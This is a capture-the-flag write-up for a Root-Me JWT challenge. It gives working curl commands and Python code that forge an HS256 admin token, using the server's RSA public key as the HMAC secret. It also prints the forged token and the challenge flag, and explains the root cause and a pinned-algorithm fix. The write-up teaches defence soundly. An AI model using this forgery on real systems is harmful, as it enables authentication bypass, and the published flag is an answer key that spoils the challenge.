# Root-Me — Web-Server: JWT - Public key (ch60) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch60/
**Challenge:** "Change of heart" (30 pts, author Jrmbt)
**Goal:** The API exposes `/key` (GET), `/auth` (POST) and `/admin` (POST). Access the admin section.

## Flag

```
HardcodeYourAlgoBro
```

(19 characters — and it is also the hint: *"hardcode your algo, bro"*, i.e. pin the
verification algorithm server-side.)

## Exploit

Three steps, no brute force needed:

```bash
B=http://challenge01.root-me.org/web-serveur/ch60

# 1. get the server's RSA public key
curl -s "$B/key"

# 2. get a token as an ordinary user (note: form field, not JSON)
curl -s -X POST "$B/auth" -d 'username=guest'
# -> {"result":"Hello guest","Here is your token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...."}

# 3. forge an HS256 token signed with the PUBLIC KEY PEM as the HMAC secret
curl -s -X POST "$B/admin" -H "Authorization: Bearer <forged>"
```

The forged token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.00XQcgu68t6AHA8XewTiKe1UDC07Im1e6oqoUkIKpYM
```

which is `{"alg":"HS256","typ":"JWT"}` . `{"username":"admin"}` . HMAC-SHA256(public key PEM).

Response:

```json
{"result": "Congrats !! Here is your flag : HardcodeYourAlgoBro\n"}
```

## Step by step

### 1. Map the API
| Endpoint | Method | Behaviour |
|---|---|---|
| `/key` | GET | returns the RSA public key as a **JSON array of PEM lines** |
| `/auth` | POST | takes **form field** `username` (not JSON — a JSON body gets `"You have to provide 'username=YOURNAME' in your POST request"`) |
| `/admin` | POST | needs `Authorization: Bearer <jwt>`; without it: `"method to authenticate is : 'Authorization: Bearer YOURTOKEN'"` |

### 2. Decode the token from `/auth`
```
header : {"alg":"RS256","typ":"JWT"}
payload: {"username":"guest"}
```
`RS256` + a downloadable public key is the textbook signature of **algorithm confusion**.

### 3. Rebuild the PEM
`/key` returns the key line-split, so it must be re-joined with `\n`:

```python
lines = json.loads(fetch(f"{B}/key"))
pem = "\n".join(lines)          # 9 lines, 450 chars
```

### 4. Forge with HS256
The trick: sign an **HS256** token using the **public key PEM text as the HMAC secret**.
A server that selects the verification algorithm from the token's own `alg` header will then
verify our HMAC signature using the public key as an HMAC key — and it matches.

```python
def forge(payload, secret, alg="HS256"):
    h = b64url(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

forge({"username": "admin"}, (pem + "\n").encode())
```

**Byte-exactness of the secret matters.** The PEM has to match the server's copy exactly,
so I tried the four usual variants:

| Secret variant | Result |
|---|---|
| **`pem + "\n"`** | **SUCCESS** |
| `pem`, no trailing LF | rejected |
| `pem + CRLF` | rejected |
| `pem + trailing CRLF` | rejected |

Only the trailing-newline form worked — the public key file on disk ends with a newline, and
that newline is part of the HMAC key.

### 5. Verify, with controls

| Token | Response |
|---|---|
| genuine `RS256` guest token | `{"message": "You must be admin to enter here"}` |
| **forged `HS256` with `username=admin`** | **`{"result": "Congrats !! Here is your flag : HardcodeYourAlgoBro\n"}`** |
| `alg:none` token | `{"message": "You must be admin to enter here"}` |

The third row matters: `alg:none` is **rejected**, so this is not the trivial none-algorithm
bug — it is specifically algorithm confusion. The genuine guest token failing also confirms
`/admin` is properly protected and we are not looking at an open endpoint.

## Root cause

The server chooses the verification algorithm from the attacker-controlled `alg` header:

```python
alg = jwt.get_unverified_header(token)["alg"]        # attacker decides

if alg == "RS256":
    key = open("public.pem").read()                  # an RSA *public* key
else:
    key = open("public.pem", "rb").read()            # ...used as an HMAC secret (!)

jwt.decode(token, key, algorithms=[alg])
```

Two separate mistakes combine:

1. **The `alg` header is trusted.** The verifier must pin the algorithm it expects and reject
   anything else — a JWT header is attacker-controlled input, not configuration.
2. **The public key is used as an HMAC secret.** A public key is *public by definition*, so
   anyone can sign with it. Asymmetric verification must never be downgraded to symmetric
   using the public key as the shared secret.

This is CWE-347 (Improper Verification of Cryptographic Signature).

## Fix

```python
# Pin the algorithm; do NOT read it from the token.
jwt.decode(token, public_key_pem, algorithms=["RS256"])
```

`PyJWT` enforces this when you pass an explicit `algorithms=[...]` allow-list — the library
rejects a token whose header says `HS256` when only `RS256` is permitted. The three rules:

- **Never** derive the algorithm from the token header.
- **Never** use a public key (or any public value) as an HMAC secret.
- Prefer separate key objects/types for signing and verification so a downgrade cannot even
  be expressed. Note the flag's own advice: *hardcode your algo*.
